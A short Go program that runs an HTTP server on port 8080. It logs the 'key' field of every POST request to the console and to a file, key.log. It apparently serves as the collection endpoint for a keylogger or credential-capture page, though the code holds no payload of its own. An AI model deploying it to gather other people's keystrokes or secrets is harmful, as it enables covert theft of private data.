package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
)

func listener(w http.ResponseWriter, r *http.Request) {

	switch r.Method {
	case "POST":
		if err := r.ParseForm(); err != nil {
			fmt.Fprintf(w, "ParseForm() err: %v", err)
			return
		}

		key := r.PostFormValue("key")
		fmt.Println(key)
		f, err := os.OpenFile("key.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println(err)
		}
		if _, err := f.WriteString(key + "\n"); err != nil {
			log.Println(err)
		}
		defer f.Close()

	default:
		fmt.Fprintf(w, "Tssss")
	}
}

func main() {
	http.HandleFunc("/", listener)

	fmt.Printf("Starting server for testing HTTP POST...\n")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}
